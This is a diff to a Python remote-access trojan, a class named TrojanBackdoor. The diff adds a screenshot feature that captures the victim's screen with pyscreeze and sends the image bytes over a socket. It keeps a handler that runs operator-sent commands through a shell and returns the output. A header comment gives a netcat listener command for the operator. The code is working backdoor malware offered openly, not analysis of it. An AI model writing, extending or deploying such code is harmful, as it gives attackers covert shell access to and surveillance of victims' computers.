@@ -1,7 +1,7 @@
 """
 nc -vv -l -p 8080  #Listen to the 8080 port locally
 """
-import socket, os, time, threading, sys
+import socket, os, time, threading, sys, pyscreeze
 from subprocess import Popen, PIPE
 
 class TrojanBackdoor(threading.Thread):
@@ -51,11 +51,39 @@ class TrojanBackdoor(threading.Thread):
             print("Receive message error: ", e)
 
     def send_message(self, message="Returning data"):
-        try:
-            self.conn.send(message.encode())
-            print("Sending message: ", message)
-        except Exception as e:
-            print("Send message error: ", e)
+        if message == "":
+            message = "No std_out or std_err output, try again"
+            try:
+                self.conn.send(message.encode())
+            except Exception as e:
+                print("Send message error: ", e)
+        elif isinstance(message, bytes):
+            try:
+                self.conn.sendall(message)
+            except Exception as e:
+                print("Send message error: ", e)
+        else:
+            try:
+                self.conn.send(message.encode())
+                # print("Sending message: ", message)
+            except Exception as e:
+                print("Send message error: ", e)
+
+    def execute_shell_command(self):
+        command = self.master_message[3:]
+        p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+        std_out, std_err =  p.communicate()
+        if std_out != b"":
+            self.send_message(std_out.decode())
+        else:
+            self.send_message(std_err.decode())
+
+    def execute_screenshot(self):
+        pyscreeze.screenshot("screenshot.png")
+        size = os.path.getsize("screenshot.png")
+        with open("screenshot.png", "rb") as f:
+            self.send_message(f.read())
+        self.send_message("screenshot command Executed")
 
     def backdoor_logic(self):
         while True:
@@ -72,19 +100,6 @@ class TrojanBackdoor(threading.Thread):
                     break
                 else:
                     self.send_message("Unknown command, please try again")
-
-    def execute_shell_command(self):
-        command = self.master_message[3:]
-        p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
-        std_out, std_err =  p.communicate()
-        if std_out != b"":
-            self.send_message(std_out.decode())
-        else:
-            self.send_message(std_err.decode())
-
-    def execute_screenshot(self):
-        pass
-        self.send_message("screenshot command Executed")
 
     def run(self):
         self.create_socket()
